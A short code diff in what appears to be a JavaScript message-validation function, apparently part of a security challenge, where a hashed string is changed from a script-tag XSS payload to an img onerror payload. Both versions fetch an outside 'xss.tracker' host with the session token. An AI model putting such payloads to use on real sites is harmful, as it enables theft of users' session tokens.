@@ -152,7 +152,7 @@ postMessage = async(req,resp) => {
 
 validateMessage = (message, challengeCodeUrl) => {
   //check integrity
-  var toHash = "<script>fetch('https://xss.tracker?token='+sessionStorage.token)</script>"+message.pubKey;
+  var toHash = "<img src=bla onerror=\"fetch('https://xss.tracker?token='+sessionStorage.token)\">"+message.pubKey;
   var hash = crypto.createHash('sha256').update(toHash).digest('hex');
 
   if(message.integrity===hash){
